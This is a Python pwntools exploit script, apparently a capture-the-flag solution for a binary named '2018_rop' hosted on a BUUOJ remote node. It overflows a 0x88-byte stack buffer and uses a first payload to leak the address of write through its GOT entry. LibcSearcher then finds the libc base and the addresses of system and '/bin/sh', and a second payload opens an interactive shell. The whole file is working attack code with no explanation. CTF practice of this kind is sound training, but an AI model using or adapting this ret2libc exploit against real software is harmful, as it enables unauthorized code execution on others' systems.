from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
io = process('./2018_rop')
io = remote('node4.buuoj.cn',29784)

elf = ELF('./2018_rop')

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x80484C6

payload1 = b'a' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(8)

io.sendline(payload1)


write_addr = io.recv()[0:4]
print(write_addr)
write_addr = u32(write_addr)
print('write_addr:',hex(write_addr))


libc = LibcSearcher('write',write_addr)
libcbase = write_addr - libc.dump('write')
system_addr = libcbase + libc.dump('system')
sh_addr = libcbase + libc.dump('str_bin_sh')

#
# libc=ELF('./libc-2.27.so')
# system_libc=libc.symbols['system']
# binsh_libc=next(libc.search(b'/bin/sh'))
# write_libc=libc.symbols['write']
#
# base=write_addr-write_libc
# system_addr=system_libc+base
# sh_addr=binsh_libc+base


payload2 = b'a' * (0x88 + 4) + p32(system_addr) + p32(1234) + p32(sh_addr)

io.sendline(payload2)

io.interactive()
